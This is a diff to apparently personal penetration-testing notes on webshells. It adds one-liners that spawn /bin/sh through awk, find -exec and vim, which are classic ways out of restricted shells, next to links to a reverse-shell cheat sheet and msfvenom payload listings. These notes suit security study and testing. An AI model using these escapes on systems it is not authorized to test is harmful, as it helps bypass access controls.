@@ -19,6 +19,7 @@ Webshell is a script written in a language that is executed by a server. Web she
     - [Cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
     - [Shell creation](https://rosettacode.org/wiki/Execute_a_system_command).
     - [About webshells](https://github.com/BlackArch/webshells).
+    - 
 
 
 Sidenote: Also, you can generate a webshell by using  msfvenom
@@ -165,4 +166,38 @@ Also msfvenom can use metasploit payloads under “cmd/unix”  to generate one-
 
 ```bash
 msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
+```
+
+
+
+### awk
+
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+
+### find 
+
+```bash
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+# This use of the find command is searching for any file listed after the -name option, then it executes awk (/bin/awk) and runs the same script we discussed in the awk section to execute a shell interpreter.
+
+find . -exec /bin/sh \; -quit
+# This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.
+```
+
+
+### VIM
+
+```bash
+vim -c ':!/bin/sh'
+```
+
+**VIM escape**:
+
+```shell-session
+vim
+:set shell=/bin/sh
+:shell
 ```
